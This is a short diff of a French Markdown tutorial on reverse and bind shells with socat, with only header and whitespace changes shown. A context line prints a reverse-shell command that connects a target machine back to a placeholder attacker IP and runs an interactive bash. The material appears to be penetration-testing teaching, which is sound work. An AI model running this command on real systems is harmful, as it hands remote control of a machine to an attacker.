@@ -3,7 +3,7 @@
 
 Pour setup un reverse shell avec socat c'est légèrement plus compliqué qu'avec netcat.
 
-#### 1- Listener
+#### 1- Listener 
 
 Sur notre machine il faut effectuer la commande :
 
@@ -32,3 +32,4 @@ user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
 
 ## __Bind shell__
 
+#### 1- Listener
